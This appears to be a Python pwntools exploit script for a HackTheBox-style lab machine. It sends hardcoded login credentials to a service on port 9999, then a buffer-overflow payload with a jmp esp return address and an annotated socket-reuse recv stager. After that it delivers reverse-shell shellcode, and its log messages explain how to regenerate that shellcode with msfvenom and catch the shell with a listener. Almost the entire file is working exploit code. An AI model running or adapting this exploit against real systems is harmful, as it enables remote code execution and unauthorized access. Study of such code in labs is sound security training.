#!/usr/bin/python3
from pwn import *

import sys, signal


def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


buf = b""
buf += b"\xbe\xf0\xdb\x13\x4f\xda\xdf\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x52\x31\x70\x12\x03\x70\x12\x83\x30\xdf\xf1"
buf += b"\xba\x4c\x08\x77\x44\xac\xc9\x18\xcc\x49\xf8\x18\xaa"
buf += b"\x1a\xab\xa8\xb8\x4e\x40\x42\xec\x7a\xd3\x26\x39\x8d"
buf += b"\x54\x8c\x1f\xa0\x65\xbd\x5c\xa3\xe5\xbc\xb0\x03\xd7"
buf += b"\x0e\xc5\x42\x10\x72\x24\x16\xc9\xf8\x9b\x86\x7e\xb4"
buf += b"\x27\x2d\xcc\x58\x20\xd2\x85\x5b\x01\x45\x9d\x05\x81"
buf += b"\x64\x72\x3e\x88\x7e\x97\x7b\x42\xf5\x63\xf7\x55\xdf"
buf += b"\xbd\xf8\xfa\x1e\x72\x0b\x02\x67\xb5\xf4\x71\x91\xc5"
buf += b"\x89\x81\x66\xb7\x55\x07\x7c\x1f\x1d\xbf\x58\xa1\xf2"
buf += b"\x26\x2b\xad\xbf\x2d\x73\xb2\x3e\xe1\x08\xce\xcb\x04"
buf += b"\xde\x46\x8f\x22\xfa\x03\x4b\x4a\x5b\xee\x3a\x73\xbb"
buf += b"\x51\xe2\xd1\xb0\x7c\xf7\x6b\x9b\xe8\x34\x46\x23\xe9"
buf += b"\x52\xd1\x50\xdb\xfd\x49\xfe\x57\x75\x54\xf9\x98\xac"
buf += b"\x20\x95\x66\x4f\x51\xbc\xac\x1b\x01\xd6\x05\x24\xca"
buf += b"\x26\xa9\xf1\x5d\x76\x05\xaa\x1d\x26\xe5\x1a\xf6\x2c"
buf += b"\xea\x45\xe6\x4f\x20\xee\x8d\xaa\xa3\x1b\x58\xba\x35"
buf += b"\x74\x5e\xc2\x38\x3f\xd7\x24\x50\x2f\xbe\xff\xcd\xd6"
buf += b"\x9b\x8b\x6c\x16\x36\xf6\xaf\x9c\xb5\x07\x61\x55\xb3"
buf += b"\x1b\x16\x95\x8e\x41\xb1\xaa\x24\xed\x5d\x38\xa3\xed"
buf += b"\x28\x21\x7c\xba\x7d\x97\x75\x2e\x90\x8e\x2f\x4c\x69"
buf += b"\x56\x17\xd4\xb6\xab\x96\xd5\x3b\x97\xbc\xc5\x85\x18"
buf += b"\xf9\xb1\x59\x4f\x57\x6f\x1c\x39\x19\xd9\xf6\x96\xf3"
buf += b"\x8d\x8f\xd4\xc3\xcb\x8f\x30\xb2\x33\x21\xed\x83\x4c"
buf += b"\x8e\x79\x04\x35\xf2\x19\xeb\xec\xb6\x3a\x0e\x24\xc3"
buf += b"\xd2\x97\xad\x6e\xbf\x27\x18\xac\xc6\xab\xa8\x4d\x3d"
buf += b"\xb3\xd9\x48\x79\x73\x32\x21\x12\x16\x34\x96\x13\x33"


recv = b""
recv += b"\x54"  # Push esp
recv += b"\x58"  # pop eax
recv += b"\x66\x05\x90\x01"  # add ax, 0x190
recv += b"\x66\x2d\x48\x01"  # sub ax, 0x148
recv += b"\x8b\x30"  # mov esi, dword[eax]
recv += b"\x83\xec\x64"  # sub esp, 0x64
recv += b"\x31\xdb"  # xor ebx, ebx
recv += b"\x53"  # push ebx
recv += b"\x66\x81\xc3\x01\x04"  # add bx, 0x401
recv += b"\x53"  # push ebx
recv += b"\x54"  # push esp
recv += b"\x5b"  # pop ebx
recv += b"\x66\x83\xc3\x64"  # add bx, 0x64
recv += b"\x53"  # push ebx
recv += b"\x56"  # push esi

# RECV call
recv += b"\xa1\xac\x82\x90\x71"  # mov eax, dword[0x719082ac]
recv += b"\xff\xd0"  # call eax


offset = 66 - len(recv)
junk = recv + (b"\x90" * offset)
jmp_esp = p32(0x7190239F)
jmp_esp70 = b"\xeb\xb8"  # jmp $-70


payload = junk + jmp_esp + jmp_esp70

target_ip = "10.10.11.115"
port = 9999

context.log_level = "DEBUG"
log.critical("Need to adapt the buf var with your own shellcode")
log.critical("run this to get yours: msfvenom -p windows/shell_reverse_tcp LHOST=<your ip HTB> LPORT=443 EXITFUNC=thread -b '\x00' -f python")
log.warning("You need to run a listener on port 443 (or choosen port for the shellcode)")
log.warning(
    "This buffer overflow is very instable... The machine will reset time to time, and maybe need to run this script many times"
)


r = remote(target_ip, port)
r.recvuntil(b"Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

sleep(5)

r.sendline(buf)

sleep(20)
